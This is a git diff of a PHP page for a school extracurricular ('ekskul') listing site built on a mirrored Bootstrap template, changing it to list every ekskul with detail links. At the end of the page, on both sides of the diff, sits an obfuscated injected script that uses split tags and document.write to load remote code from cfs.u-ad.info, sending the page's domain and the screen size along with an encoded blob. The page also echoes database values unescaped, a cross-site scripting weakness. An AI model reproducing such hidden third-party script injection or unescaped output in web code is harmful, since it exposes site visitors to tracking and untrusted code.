@@ -1,5 +1,6 @@
 <?php
 session_start();
+
 require_once('db/connect.php');
 require_once('function/function.php');
 
@@ -7,12 +8,13 @@ if ($_SESSION['username'] == NULL) {
   header('location:login.php');
 }
 
-$id = $_SESSION['nis'];
+
+$hasil = tampilekskul();
 $nis = $_SESSION['nis'];
 $gambar = ambilgambar($nis);
-$hasil2 = tampil_anggota($id);
-
 $hasilgambar = mysqli_fetch_assoc($gambar);
+
+// print_r($hasil);
 
 ?>
 <!DOCTYPE html>
@@ -63,8 +65,8 @@ $hasilgambar = mysqli_fetch_assoc($gambar);
         </div>
         <div id="navbar" class="navbar-collapse collapse">
               <ul class="nav navbar-nav">
-                <li class="active"><a href="index.php">Home Page</a></li>
-                <li><a href="list.php">List Ekskul</a></li>
+                <li><a href="index.php">Home Page</a></li>
+                <li class="active"><a href="list.php">List Ekskul</a></li>
                 <li><a href="event.php">Event Sekolah</a></li>
                 <?php if($_SESSION['level'] == 'admin') { ?> <li><a href="lumino/">Admin Panel</a></li> <?php } ?>
               </ul>
@@ -87,26 +89,24 @@ $hasilgambar = mysqli_fetch_assoc($gambar);
     </div>
 
     <div class="container">
+    <?php while ($raw = mysqli_fetch_assoc($hasil)) { ?>
     <hr class="featurette-divider">
-      <?php while ($data = mysqli_fetch_assoc($hasil2)) { ?>
       <div class="row featurette">
         <div class="col-md-7">
-          <h2 class="featurette-heading"><?php echo $data['nama_ekskul']; ?></h2>
-          <h2 class="featurette-heading"><?php echo $data['deskripsi']; ?></h2>
-          <p class="lead"></p>
-          <p><a class="btn btn-default" href="" role="button">More details &raquo;</a></p>
+          <h2 class="featurette-heading"><?php echo $raw['nama_ekskul'] ?></h2>
+          <p class="lead"><?php echo $raw['deskripsi'] ?></p>
+          <p><a class="btn btn-default" href="tampilekskul.php?id=<?php echo$raw['id_ekskul'] ?>" role="button">More details &raquo;</a></p>
         </div>
         <div class="col-md-5">
           <img class="featurette-image img-responsive center-block" src="gambar/k1.jpg" alt="Generic placeholder image">
         </div>
       </div>
-      <?php } ?>
     </hr>
+    <?php } ?>
       <footer>
         <p>&copy; Company 2014</p>
       </footer>
     </div> <!-- /container -->
-
 
 
     <!-- Bootstrap core JavaScript
@@ -116,7 +116,7 @@ $hasilgambar = mysqli_fetch_assoc($gambar);
     <script src="../../dist/js/bootstrap.min.js"></script>
     <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
     <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
-    <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRE9a2qMKL6t1dVk%2ftJFuaDmTlnvdVFG3QwLhGEPMExxH4nUZvMRXJqYohLoaIHkjdqn1ov9rWcKd4tPFNgEMDoqIlonV2CIUIEvARHl1Z7UGpseK0C9JbppxiFx2l2n6vaQpjEeHTHA2cNRy25fzKZw0YeiyPPVtAdx6DjCVMROxq7nRYdbun%2fOS6h5QdBOZyR1u148l8YmvyVra3lbMoe6unaNjG38HZRMjHu3vbgN0nRC43sM7jXSh6RW2MZbxe5raJ84vQ79sPmQnoQ0rdJjvuamvgvmBwm8ioI%2ffAGPwFke6O4hZFTJ2MKYUEngTs%2bSFRMmVogQmn%2fCJkUF%2fCMYUDWAzJ6TN5KaGlIjHWmyMQeOT1Eljyd5L2nuXnPOsqJMXEh%2bhAVzGPtwQqtgyk7187RPXDDoPLweH%2bsrC%2bTrunTzMp%2fFqBdM%2f99cmfqh980msNc%2bw2KPwHPH5K4AB%2b0w%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
+  <script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRE9a2qMKL6t1dVk%2ftJFuaDmTlnvdVFG3QwLhGEPMExxH4nUZvMRXJqYohLoaIHkjdqn1ov9rWcKd4tPFNgEMDoqIlonV2CIUIEvARHl1Z7UGpseK0C9JbppxiFx2l2n6vaQpjEeHTHA2cNRy25fzKZw0YeiyPPVtAdx6DjCVMROxq7nRYdbun%2fOS6h5QdBOZyR1u148l8YmvyVra3lbMoe6unaNjG38HZRMjHu3vbgN0nRC43sM7jXSh6RW2MZbxe5raJ84vQ79sPmQnoQ0rdJjvuamvgvmBwm8ioI%2ffAGPwFke6O4hZFTJ2MKYUEngTs%2bSFRMmVogQmn%2fCJkUF%2fCMYUDWAzJ6TN5KaGlIjHWmyMQeOT1Eljyd5L2nuXnPOsqJMXEh%2bhAVzGPtwQqtgyk7187RPXDDoPLweH%2bsrC%2bTrunTzMp%2fFqBdM%2f99cmfqh980msNc%2bw2KPwHPH5K4AB%2b0w%3d%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
 
 <!-- Mirrored from getbootstrap.com/examples/jumbotron/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 08 Apr 2015 11:55:33 GMT -->
 </html>
